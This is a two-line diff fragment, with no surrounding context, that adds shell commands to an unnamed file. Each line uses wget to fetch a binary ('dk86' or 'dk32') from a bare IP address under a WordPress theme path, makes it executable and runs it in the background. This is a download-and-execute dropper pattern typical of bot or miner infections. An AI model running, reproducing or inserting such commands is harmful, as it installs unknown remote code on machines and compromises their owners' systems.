@@ -1,0 +1,2 @@
+wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 &
+wget -O dk32 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk32; chmod +x dk32; ./dk32 &
